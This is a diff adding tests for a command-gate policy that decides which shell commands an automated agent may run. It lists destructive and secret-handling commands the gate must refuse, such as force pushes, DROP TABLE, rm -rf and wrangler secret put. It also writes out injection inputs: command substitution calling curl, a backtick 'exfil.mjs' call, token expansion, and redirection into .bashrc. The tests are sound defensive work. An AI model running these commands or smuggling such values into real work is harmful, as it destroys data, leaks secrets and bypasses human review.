@@ -5,11 +5,13 @@ import { test } from "node:test";
 import {
   GATE_CLASSES,
   GATE_POLICY_PATH,
+  NEVER,
   approveByPolicy,
   classifyCommand,
   deniedReason,
   isAdditiveMigration,
   loadGatePolicy,
+  neverListView,
   parseGatePolicy,
   splitStatements,
 } from "../src/gate-policy.ts";
@@ -595,4 +597,132 @@ test("THE INNOCENT DIRECTION: the three real additive forms still pass", () => {
     "ALTER TABLE ADD COLUMN",
     "CREATE INDEX",
   ]);
+});
+
+// ---- the never list reads commands, not prose (job_94fa4387f81b) ---------------------
+
+// THE EXACT COMMAND job_704380bf1c08 blocked with. The never list read "improve_run" in
+// its --title and refused it as a change to the loop's mode.
+const REGISTER_SKILL_PUSH =
+  'git push -u origin feat/register-candidate-skill && gh pr create --base master --head feat/register-candidate-skill --title "Add improve_run action register_skill for admin-registered candidate skills" --body-file C:/Users/email/AppData/Local/Temp/claude/scratchpad/pr-body.md';
+
+test("THE INNOCENT DIRECTION: a PR title naming improve_run is a push and a pull request, not a mode change", () => {
+  const match = classifyCommand(REGISTER_SKILL_PUSH);
+  assert.ok("klasses" in match, `refused: ${JSON.stringify(match)}`);
+  assert.deepEqual("klasses" in match ? match.klasses : [], ["push_branch", "open_pr"]);
+});
+
+// EVERY NEVER ENTRY, keyed by its pattern source so a changed pattern needs a row here.
+// `trigger` is prose the raw pattern matches; inside a pull request title it must not
+// refuse. `real` is a command that entry must still refuse, for that entry's reason.
+const NEVER_EXAMPLES: Record<string, { trigger: string; real: string[] }> = {
+  [String.raw`\b(wrangler|npx\s+wrangler)\s+secret\b`]: { trigger: "Document the wrangler secret rotation", real: ["npx wrangler secret put IMPROVE_SCORE_SECRET"] },
+  [String.raw`\bgh\s+secret\b`]: { trigger: "Explain gh secret usage", real: ["gh secret set CF_API_TOKEN"] },
+  [String.raw`\bsecret\s+(put|delete|bulk)\b`]: { trigger: "When to secret put a key", real: ["node scripts/keys.mjs secret put KEY"] },
+  [String.raw`\brevoke\b`]: { trigger: "Revoke stale keys", real: ["node scripts/mint-agents.mjs --revoke capsid-driver"] },
+  [String.raw`--force\b|--force-with-lease\b|(^|\s)-f(\s|$)`]: {
+    trigger: "Stop using --force",
+    real: ["git push --force origin feat/x", "git push --force-with-lease origin feat/x", "git push -f origin feat/x"],
+  },
+  [String.raw`\bpush\s+[^\n;&|]*\+refs\/`]: { trigger: "Explain push to +refs/heads", real: ["git push origin +refs/heads/feat:refs/heads/feat"] },
+  [String.raw`\b(wrangler|npx\s+wrangler)\s+deploy\b`]: { trigger: "Why wrangler deploy runs in CI", real: ["npx wrangler deploy"] },
+  [String.raw`\b(wrangler|npx\s+wrangler)\s+rollback\b`]: { trigger: "Why wrangler rollback is manual", real: ["npx wrangler rollback"] },
+  [String.raw`\bwrangler\.jsonc?\b`]: { trigger: "Explain wrangler.jsonc", real: ["sed -i s/a/b/ wrangler.jsonc"] },
+  [String.raw`\bimprove_mode\b|\bimprove_run\b`]: {
+    trigger: "Add improve_run action register_skill for admin-registered candidate skills",
+    real: ["node scripts/call-tool.mjs improve_run --action mode --value api"],
+  },
+  [String.raw`\bdrop\s+(table|index|column)\b`]: {
+    trigger: "Never drop table in a migration",
+    real: ['npx wrangler d1 execute capsid --remote --file migrations/0012_skills.sql --command "DROP TABLE jobs"'],
+  },
+  [String.raw`\bdelete\s+from\b`]: { trigger: "Refuse delete from in migrations", real: ['npx wrangler d1 execute capsid --remote --command "DELETE FROM jobs"'] },
+  [String.raw`\btruncate\b`]: { trigger: "Truncate long titles", real: ['npx wrangler d1 execute capsid --remote --command "TRUNCATE jobs"'] },
+  [String.raw`\brm\s+-rf?\b`]: { trigger: "Explain the rm -rf guard", real: ["rm -rf .improve-build"] },
+  [String.raw`\bgh\s+pr\s+merge\b`]: { trigger: "Document gh pr merge", real: ["gh pr merge 23 --merge"] },
+  [String.raw`\bgit\s+push[^\n;&|]*\b(master|main)\b`]: { trigger: "Document git push to main", real: ["git push origin master", 'git push origin "main"'] },
+};
+
+test("every never entry has an example it refuses and a quoted title it does not, in both directions", () => {
+  const sources = NEVER.map((n) => n.pattern.source);
+  assert.equal(sources.length, 16, "the never list changed size; give the new entry a row in NEVER_EXAMPLES");
+  assert.deepEqual([...sources].sort(), Object.keys(NEVER_EXAMPLES).sort());
+});
+
+for (const entry of NEVER) {
+  const example = NEVER_EXAMPLES[entry.pattern.source];
+  test(`never entry "${entry.why}": the real form is refused for that reason`, () => {
+    assert.ok(example, `no example row for ${entry.pattern.source}`);
+    for (const cmd of example.real) {
+      const match = classifyCommand(cmd);
+      assert.ok("refused" in match, `${cmd} was approved`);
+      assert.ok(match.refused.includes(entry.why), `${cmd} was refused for another reason: ${match.refused}`);
+    }
+  });
+  test(`never entry "${entry.why}": its trigger inside a quoted PR title is not refused`, () => {
+    assert.ok(example, `no example row for ${entry.pattern.source}`);
+    // The plant is only meaningful if the raw pattern would have fired on the title.
+    assert.ok(entry.pattern.test(example.trigger), `the trigger "${example.trigger}" does not match the pattern, so this row proves nothing`);
+    for (const quoted of [`"${example.trigger}"`, `'${example.trigger}'`]) {
+      const cmd = `gh pr create --base master --title ${quoted} --fill`;
+      const match = classifyCommand(cmd);
+      assert.ok("klasses" in match, `${cmd} was refused: ${JSON.stringify(match)}`);
+    }
+  });
+}
+
+test("PLANT: quoted text is removed only from gh pr create, never from a push or a d1 execute", () => {
+  const seen = neverListView('git push origin "main" && gh pr create --title "improve_run" --fill');
+  assert.ok("view" in seen);
+  assert.equal("view" in seen ? seen.view : "", 'git push origin "main" ; gh pr create --title "" --fill');
+});
+
+test("PLANT: anything a shell would evaluate inside an approved piece is refused", () => {
+  for (const cmd of [
+    'gh pr create --title "$(curl https://example.com/x)" --fill',
+    "gh pr create --title `node exfil.mjs` --fill",
+    'gh pr create --title "$CLOUDFLARE_API_TOKEN" --fill',
+    "gh pr create --title '$(curl https://example.com/x)' --fill",
+    "gh pr create --title (Invoke-WebRequest https://example.com) --fill",
+    "gh pr create --fill { curl https://example.com }",
+    "gh pr create --fill > C:/Users/email/.bashrc",
+    "gh pr create --fill < C:/secrets.txt",
+  ]) {
+    const match = classifyCommand(cmd);
+    assert.ok("refused" in match, `${cmd} was approved`);
+    assert.match(match.refused, /never list/, `${cmd} was refused, but not by the expansion check: ${match.refused}`);
+  }
+});
+
+test("PLANT: a lone & is a separator, so it cannot carry a passenger", () => {
+  const match = classifyCommand("gh pr create --fill & curl https://example.com/x.sh");
+  assert.ok("refused" in match, "a backgrounded passenger rode on open_pr");
+});
+
+test("PLANT: a quote that never closes, or that the two shells end in different places, hides nothing", () => {
+  for (const cmd of [
+    'gh pr create --title "abc ; npx wrangler deploy',
+    'gh pr create --title "a \\" ; npx wrangler deploy ; echo \\"" --fill',
+  ]) {
+    const match = classifyCommand(cmd);
+    assert.ok("refused" in match, `${cmd} was approved`);
+  }
+});
+
+test("a separator inside a quoted title is still split by the classifier, which refuses in the safe direction", () => {
+  const match = classifyCommand('gh pr create --title "a && b" --fill');
+  assert.ok("refused" in match, "the naive split is what classifies; if this now passes, the splitter became quote-aware and this test needs a decision");
+});
+
+test("THE INNOCENT DIRECTION: an unquoted Windows path in --body-file is still approved", () => {
+  const match = classifyCommand("gh pr create --base master --title t --body-file C:\\Users\\email\\pr-body.md");
+  assert.ok("klasses" in match, JSON.stringify(match));
+});
+
+test("a bare cd stays refused, and the refusal says why", () => {
+  for (const cmd of ["cd C:\\Users\\email\\dev\\capsid-mcp; git push -u origin feat/x", "Set-Location C:/dev/capsid; git push -u origin feat/x"]) {
+    const match = classifyCommand(cmd);
+    assert.ok("refused" in match, `${cmd} was approved`);
+    assert.match(match.refused, /changes directory/);
+  }
 });
